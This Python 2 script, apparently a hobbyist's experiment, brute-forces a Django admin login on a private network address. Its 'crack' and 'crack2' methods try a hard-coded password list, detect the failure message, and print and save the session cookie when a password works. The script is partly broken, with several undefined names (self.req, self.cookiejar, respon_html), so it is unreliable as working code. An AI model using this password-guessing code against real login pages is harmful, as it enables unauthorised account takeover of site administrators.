#!/usr/bin/python
#coding=utf8
#filename:web_auth_cookie_django2.py
"""
20130716-1500 http://192.168.1.214:8000/admin/
Python3 urllib 实例
http://www.itwhy.org/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/python/python3-urllib-%E5%AE%9E%E4%BE%8B.html
"""
import urllib
import urllib2
import cookielib
import time

class Auth_Cookie():
    #def __init__(self, user_agent, cookie_file, url, username):
    def __init__(self, user_agent):
        self.opener = urllib2.build_opener()
        urllib2.install_opener(self.opener)
        client_headers = ('User-Agent', user_agent)
        self.opener.addheaders = [client_headers]

        ###self.req = urllib2.Request(url, client_headers)
        ###self.user_crack = username

    def add_cookie(self):
        cookiejar = cookielib.CookieJar()
        self.opener.add_handler(urllib2.HTTPCookieProcessor(cookiejar))

    def get_pre(self, url, charset='utf-8'):
        try:
            response = urllib2.urlopen(url)
        except urllib2.HTTPError, e:
            print "at urllib2.urlopen, raise ERROR (", e, ")"
            return
        return response

    def post_and_cookie(self, url, params={}, headers={}, charset='utf-8'):
        """将get_pre普通访问后获取的sessionid信息附加到cookie"""
        params = urllib.urlencode(params)
        request = urllib2.Request(url, data=params.encode(charset))
        for k, v in headers.items():
            request.add_header(k, v)

        try:
            response = urllib2.urlopen(request)
        except urllib2.HTTPError as e:
            print "at urllib2.urlopen, has a error (", e, ")"
            return
        return response
    
    def crack(self, pwd_list, username="admin"):
        """
        pwd_list ==> ['111', '222', .....]
        req = urllib2.Request(url=arg1, headers=client_headers, data=pwd_encode)"""
        for key1 in pwd_list:
            pwd_encode = urllib.urlencode({
                    'username': username,
                    'password': key1,
                    'this_is_the_login_form': 1,
                    'next': '/admin/',
                    #'Cookie': "csrftoken=" + csrfM + ";" + "sessionid=" + sessionId,
                    #'csrfmiddlewaretoken': csrfM,
                    })
            try:
                response = self.opener.open(self.req, pwd_encode)
            except urllib2.HTTPError, e:
                print "at opener.open, raise ERROR (", e, ") "
                #print type(response)
                continue
                #return
            response_resu = response.getcode()
            if response_resu == 200:
                response_html = response.read()
                #怎么样判断是通过验证，标志是***用户登陆失败***
                case = respon_html.find('Please enter the correct')
                if case != -1:
                    #print "false.....", key1
                    pass
                else:
                    print time.ctime(), " Find The Key: ", key1
                    self.cookiejar.save()
                    return "good luck"
        return "error"

    def crack2(self, pwd):
        """
        pwd_list ==> '111'
        req = urllib2.Request(url=arg1, headers=client_headers, data=pwd_encode)
        """
        pwd_encode = urllib.urlencode({
                'userName': self.user_crack,
                'password': pwd,
                })
        try:
            response = self.opener.open(self.req, pwd_encode)
        except urllib2.HTTPError, e:
            print "at opener.open, raise ERROR", e
            return
        response_resu = response.getcode()
        if response_resu == 200:
            response_html = response.read()
            #怎么样判断是通过验证，标志是***用户登陆失败***
            case = respon_html.find('Please enter the correct')
            if case != -1:
                #print "false.....", key1
                return
            else:
                print time.ctime(), " Find The Key: ", key1
                self.cookiejar.save('/tmp/cookie_django_crack.txt')
                print "good luck"
                exit(0)

#ready to crack:
url11 = "http://192.168.1.214:8000/admin/"
url_pre = "http://192.168.1.214:8000/blog/add/"
file11 = "/tmp/cookie11.txt"
agent11 = "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)"
pwd11 = ['admin', 'aaa', 'bbb', 'ksksie','ssdssw','scbh001', 'admin1']
aaa1 = ""
para1 = {
    'username': 'admin',
    'password': 'admin',
    'this_is_the_login_form': 1,
    'next': '/admin/',
    }

if __name__ == "__main__":
    s11 = Auth_Cookie(agent11)
    s11.add_cookie()

    respon_get = s11.get_pre(url11)
    print respon_get.read()
    respon_post = s11.post_and_cookie(url=url11, params=para1)
    print respon_post.read()


